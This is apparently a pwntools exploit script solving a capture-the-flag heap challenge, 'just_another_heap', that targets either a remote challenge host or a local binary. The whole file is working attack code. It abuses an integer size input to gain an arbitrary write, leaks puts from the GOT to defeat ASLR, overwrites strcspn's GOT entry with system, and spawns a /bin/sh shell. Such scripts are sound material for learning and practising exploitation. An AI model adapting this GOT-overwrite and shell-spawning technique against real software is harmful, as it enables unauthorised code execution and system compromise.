#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./just_another_heap')
binary.symbols['names'] = 0x602260

if args.REMOTE:
	p = remote('dctf-chall-just-another-heap.westeurope.azurecontainer.io', 7481)
	libc = ELF('./libc.so.6')
else:
	import signal
	p = process(('stdbuf -i0 -o0 -e0 '+binary.path).split(),preexec_fn=lambda: signal.signal(signal.SIGALRM, signal.SIG_IGN))
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# leak
p.sendlineafter('> ','1')
p.sendlineafter('> ','0')
p.sendlineafter('> ','blah')
p.sendlineafter('> ',str(2**64 - 2**32 + binary.sym.names + 10))
p.sendlineafter('> ',str(binary.sym.names))
p.sendlineafter('> ',p64(binary.got.puts))
p.sendlineafter('> ','N')
p.sendlineafter('> ','N')
p.sendlineafter('> ','5')

p.recvuntil('0: ')
puts = u64(p.recv(6) + b'\0\0')
log.info('puts: ' + hex(puts))
libc.address = puts - libc.sym.puts
log.info('libc.address: ' + hex(libc.address))

# got overwrite
p.sendlineafter('> ','1')
p.sendlineafter('> ','1')
p.sendlineafter('> ','blah')
p.sendlineafter('> ',str(2**64 - 2**32 + binary.got.strcspn + 10))
p.sendlineafter('> ',str(binary.got.strcspn))
p.sendlineafter('> ',p64(libc.sym.system))
p.sendlineafter('> ','N')
p.sendlineafter('> ','N')

# shell
p.sendlineafter('> ','1')
p.sendlineafter('> ','2')
p.sendlineafter('> ','/bin/sh')
p.interactive()

